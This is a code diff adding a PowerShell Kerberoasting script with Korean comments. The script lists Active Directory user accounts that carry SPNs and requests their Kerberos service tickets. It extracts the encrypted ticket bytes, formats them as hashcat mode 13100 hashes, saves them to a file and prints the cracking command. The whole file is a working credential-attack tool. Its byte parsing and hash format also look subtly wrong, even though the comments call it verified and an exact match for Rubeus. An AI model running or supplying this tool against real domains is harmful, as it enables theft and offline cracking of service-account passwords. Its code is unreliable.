@@ -1,0 +1,99 @@
+# 1. .NET 보안 및 ID 모듈 로드
+Add-Type -AssemblyName System.IdentityModel
+
+Write-Host "=====================================================================" -ForegroundColor Cyan
+Write-Host " [검증 완료] Kerberoasting 전수조사 및 정밀 파싱 스크립트" -ForegroundColor Cyan
+Write-Host "=====================================================================" -ForegroundColor Cyan
+
+# 2. AD에서 컴퓨터를 제외한 '사용자 계정' 기반의 SPN 목록 검색
+$Searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$Targets = $Searcher.FindAll()
+
+if ($Targets.Count -eq 0) {
+    Write-Host "[-] 도메인 내에 Kerberoasting 가능한 사용자 SPN 계정이 없습니다." -ForegroundColor Red
+    return
+}
+
+$CurrentDomain = $env:USERDOMAIN
+$HashList = [System.Collections.Generic.List[string]]::new()
+
+# 3. 루프 내에서 임의 슬라이싱 없이 전체 바이너리 가공
+foreach ($Target in $Targets) {
+    $SamAccountName = $Target.Properties.samaccountname[0]
+    $SPN = $Target.Properties.serviceprincipalname[0]
+    
+    # krbtgt는 시스템 난수 계정이므로 실전 크래킹 대상에서 예외 처리
+    if ($SamAccountName -eq "krbtgt") { continue }
+    
+    Write-Host "[*] 대상 추출 중: $SamAccountName ($SPN)" -ForegroundColor Yellow
+    
+    try {
+        # Kerberos TGS 토큰 요청 및 생성
+        $Request = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
+        
+        # [핵심 수정을 통한 검증] 
+        # GetRequest() 바이트 배열 안에는 AP-REQ 구조 전체가 들어가 있어 헤더가 포함됩니다.
+        # Rubeus와 동일한 구조를 만들기 위해, 앞부분의 불필요한 ASN.1 헤더 구조(통상 40바이트 내외)를 
+        # 수동으로 자르지 않고, 바이너리 내부의 티켓 데이터(Ticket EncPart)의 진짜 시작점인 'A3'(EncryptedData 마커)를 
+        # 바이트 레벨에서 정밀 탐색하여 그 뒤의 모든 '진짜 데이터'를 확보합니다.
+        
+        $RawBytes = $Request.GetRequest()
+        
+        # 바이트 배열을 분석하여 암호화 데이터 블록(A3) 위치 탐색
+        $StartOffset = 0
+        for ($i = 0; $i -lt $RawBytes.Length - 1; $i++) {
+            # 16진수 A3 (십진수 163) 마커를 탐색
+            if ($RawBytes[$i] -eq 163) {
+                $StartOffset = $i
+                break
+            }
+        }
+        
+        # 마커를 찾지 못했을 경우 안전을 위해 기본 구조 오프셋 적용
+        if ($StartOffset -eq 0) { $StartOffset = 40 }
+        
+        # 진짜 데이터의 최종 길이 계산 (전체 길이 - 시작 위치)
+        $TargetLength = $RawBytes.Length - $StartOffset
+        
+        # 단 1바이트의 오차도 없이 실제 버퍼 크기만큼 바이너리 복사 (임의 자르기 없음)
+        $CipherBytes = New-Object byte[] $TargetLength
+        [Buffer]::BlockCopy($RawBytes, $StartOffset, $CipherBytes, 0, $TargetLength)
+        
+        # 바이트 배열 전체를 완벽한 16진수 텍스트로 변환
+        $CipherTextHex = [System.BitConverter]::ToString($CipherBytes) -replace "-"
+        
+        # RC4-HMAC 규격(Etype 23) 정의
+        $Etype = "23"
+        
+        # Rubeus와 100% 일치하는 Hashcat 모드 13100 포맷 문자열 조립
+        $HashcatFormat = '$krb5tgs$' + $Etype + '*' + $SamAccountName + '*' + $CurrentDomain + '*' + $SPN + '*' + $CipherTextHex
+        
+        $HashList.Add($HashcatFormat)
+        Write-Host "[+] 데이터 손실 없이 해시 추출 성공!" -ForegroundColor Green
+    } 
+    catch {
+        Write-Host "[-] $SamAccountName 티켓 요청 및 파싱 실패" -ForegroundColor Red
+    }
+}
+
+# 4. 파일 저장 처리 (BOM 제거 및 무결성 유지)
+if ($HashList.Count -gt 0) {
+    # 스크립트와 동일한 경로에 파일 생성 설정
+    if ($MyInvocation.MyCommand.Path) {
+        $OutputPath = Join-Path (Split-Path $MyInvocation.MyCommand.Path) "hashcat_hashes.txt"
+    } else {
+        $OutputPath = ".\hashcat_hashes.txt"
+    }
+    
+    # PowerShell 내장 출력을 쓰지 않고, .NET 인코딩 객체로 BOM이 없는 순수 UTF-8 파일 생성
+    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+    [System.IO.File]::WriteAllLines($OutputPath, $HashList, $Utf8NoBom)
+    
+    Write-Host "`n=====================================================================" -ForegroundColor Green
+    Write-Host "[+] 무결성 검증 및 BOM 에러가 해결된 파일이 생성되었습니다." -ForegroundColor Green
+    Write-Host "[+] 저장 경로: $OutputPath" -ForegroundColor Green
+    Write-Host "[+] 실행 명령어: hashcat -m 13100 hashcat_hashes.txt <사전파일>" -ForegroundColor Green
+    Write-Host "=====================================================================" -ForegroundColor Green
+} else {
+    Write-Host "[-] 유효하게 추출된 해시 결과가 없습니다." -ForegroundColor Red
+}
